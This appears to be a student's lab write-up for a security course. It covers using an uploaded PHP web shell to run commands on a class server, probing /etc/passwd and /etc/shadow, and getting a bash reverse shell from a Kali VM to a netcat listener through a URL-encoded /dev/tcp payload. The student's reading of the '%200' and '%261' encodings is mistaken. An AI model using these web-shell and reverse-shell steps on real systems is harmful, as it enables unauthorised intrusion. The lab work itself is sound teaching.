@@ -1,0 +1,52 @@
+Helana Solomon
+
+=== PART 1 ===
+
+1.  This is the command I used to execute the linux command whoami on the server -"http://danger.jeffondich.com/uploadedimages/hsolomon_webshell2.php?command=whoami. The response was www-data. You must include the command as a parameter so it is plugged into the function that is running the php file.
+
+2. The <pre> tag preserves the formatting for the output of the given command. If it were removed, the layout for the output of the command would probably be messed up - there would be lines and spaces in unexpected locations.
+
+=== PART 2 ===
+
+a. The directory the danger website is located in is index.php.
+
+b. There are about 11 different user accounts on danger.jeffondich.com. I was able to figure it out by sending the ls command through the php file I created previously. Since all the account names are student's usernames, I don't know if it would be okay to list out all of the student's names.
+
+c. No, I don't have access to /etc/passwd. It says this site can't be reached. This(/etc/passwd) is a plain text file that stores essential information required to login. It contains a list of information for all user accounts on the system. It includes some details such as userID, groupID, homedirectory and default shell.
+
+d. No, I don't have access to /etc/shadow. It gives me a 404 not found message. This file (/etc/shadow) stores the hashed passphrase format for a linux user's account and other properties related to the user password. The file is directly accessible only by the root user.
+
+e. I found two files in the secret folder -> hi_jeff.txt and kindasecret.txt.
+
+=== PART 4 ===
+
+a. The IP address of my Kali VM is inet 192.168.136.128  netmask 255.255.255.0  broadcast 192.168.136.25. I got the IP address by typing ifconfig into the command prompt on Kali. 
+- inet: your device's specific ip address
+- netmask: defines the network and host portions of that ip address
+- broadcast: used to send a message to all devices on a specific local network
+
+b.  My IP addresses on my host OS are inet 172.17.191.195 netmask 255.255.240.0  broadcast 172.17.191.255. I would want to use the inet ip address because it is specific to my device & kali's device. This allows me to communicate directly to Kali's device instead of going through the other types of ip addresses.
+
+c. The port number I used was 6737. I ran nc -l -p 6737 on WSL for windows.
+
+d. The command I used: http://192.168.136.128/hsolomon_webshell3.php?command=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/172.17.191.195/6737%200%3E%261%22
+
+
+e. Yes, I have a shell that says: "www-data@kali:/var/www/html$." It allows me to execute some linux commands (I tried ls and it worked). I know it is kali because it says "@kali" where www-data is the username that is currently logged into Kali.
+
+f. The % in the URL all have different meanings.
+    %20 - encoding for a single space character
+    %22 - encoding for double quotes "
+    %26 encoding for ampersand &
+    %3E - encoding for greater than >
+
+    I was unable to find a definition for %200 and %261.
+g.
+* We want the target system to initiaze the command line
+1. First, we set up a listener on my own machine. 
+2. Then, we first forcefully and intentionally installed a massive vulnerability onto Kali.
+3. On my local machine, a launched a listener using a port that I chose. 
+4. Then we used Kali's IP Address, the target php we forcefully injected into Kali, my IP Adress and the port that I am listening on to generate a url so I can get access to a Kali shell. All of these fields were injected into the url to actually get access to the Kali terminal given the username that is currently logged in.
+
+
+** There are some questions that I am unsure of - Part 2 B and the reasoning behind Part 4 B.
